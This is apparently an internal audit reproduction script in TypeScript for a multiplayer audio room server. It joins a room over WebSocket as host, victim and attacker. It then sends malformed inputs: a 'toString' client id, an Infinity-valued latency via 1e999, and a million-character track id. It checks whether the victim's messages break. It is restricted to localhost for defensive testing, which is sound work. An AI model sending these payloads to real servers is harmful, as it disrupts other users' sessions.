/**
 * Audit repro (protocol-planner): what a hostile phone can do to a room on a REAL apps/server.
 *   PORT=8840 bun run --cwd apps/server dev        # in another shell
 *   bun run packages/protocol/scripts/repro-hostile.ts http://localhost:8840 [toString|infinity|bigid]
 * Never point this at production.
 */
import { PROTOCOL_VERSION, parseServerMessage } from "../src/index";

const api = process.argv[2] ?? "http://localhost:8840";
const which = process.argv[3] ?? "toString";
if (!/^http:\/\/(localhost|127\.0\.0\.1)[:/]/.test(api)) throw new Error("localhost only");
const wsUrl = api.replace(/^http/, "ws") + "/ws";
const device = { userAgent: "repro", platform: "repro", browserFamily: "desktop-chrome" };
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

function sock(label: string) {
  const ws = new WebSocket(wsUrl);
  const stats = { label, ok: 0, unparsable: 0, maxBytes: 0, lastBad: "" };
  ws.onmessage = (ev) => {
    const raw = String(ev.data);
    stats.maxBytes = Math.max(stats.maxBytes, raw.length);
    if (parseServerMessage(raw)) stats.ok++;
    else { stats.unparsable++; stats.lastBad = raw.slice(0, 400); }
  };
  return { ws, stats, open: () => new Promise<void>((r) => (ws.onopen = () => r())) };
}
const join = (clientId: string, roomCode: string, kind: string, hostKey?: string) =>
  JSON.stringify({ type: "JOIN", clientId, roomCode, kind, plays: kind === "player", hostKey, device, protocolVersion: PROTOCOL_VERSION });

const { code, hostKey } = (await fetch(`${api}/rooms`, { method: "POST" }).then((r) => r.json())) as { code: string; hostKey: string };
const host = sock("host"); await host.open(); host.ws.send(join("host-0000-aaaa", code, "host", hostKey));
const victim = sock("victim"); await victim.open(); victim.ws.send(join("victim-0000-aaaa", code, "player"));
await sleep(700);
const before = { ...victim.stats };

const attacker = sock("attacker"); await attacker.open();
if (which === "toString") {
  attacker.ws.send(join("toString", code, "player"));
} else if (which === "infinity") {
  attacker.ws.send(join("attacker-0000-aaaa", code, "player"));
  await sleep(100);
  // 1e999 is valid JSON and parses to Infinity; JSON.stringify(Infinity) is null on the way back out
  attacker.ws.send('{"type":"CLIENT_STATUS","rttMs":1,"syncErrMs":1,"outputLatencyMs":1e999,"audioState":"ready"}');
  await sleep(700);
  const track = ((await fetch(`${api}/tracks`).then((r) => r.json())) as { tracks: Array<{ id: string }> }).tracks[0]!.id;
  host.ws.send(JSON.stringify({ type: "SET_TRACK", trackId: track }));
  await sleep(700);
  attacker.ws.send(JSON.stringify({ type: "AUDIO_READY", trackId: track }));
  await sleep(700);
  host.ws.send(JSON.stringify({ type: "CALIBRATION_START", referenceClientId: "host-0000-aaaa" }));
  await sleep(300);
  host.ws.send(JSON.stringify({ type: "CALIBRATION_REPORT", measurements: [{ clientId: "attacker-0000-aaaa", residualMs: 3, confidence: 0.9 }] }));
} else if (which === "bigid") {
  attacker.ws.send(join("attacker-0000-aaaa", code, "player"));
  await sleep(100);
  attacker.ws.send(JSON.stringify({ type: "AUDIO_READY", trackId: "x".repeat(1_000_000) }));
}
await sleep(700);
host.ws.send(JSON.stringify({ type: "SET_MODE", mode: "WAVE", params: {} }));
await sleep(1200);
console.log(JSON.stringify({ which, before, after: victim.stats, attacker: attacker.stats }, null, 1));
host.ws.close(); victim.ws.close(); attacker.ws.close();
process.exit(0);
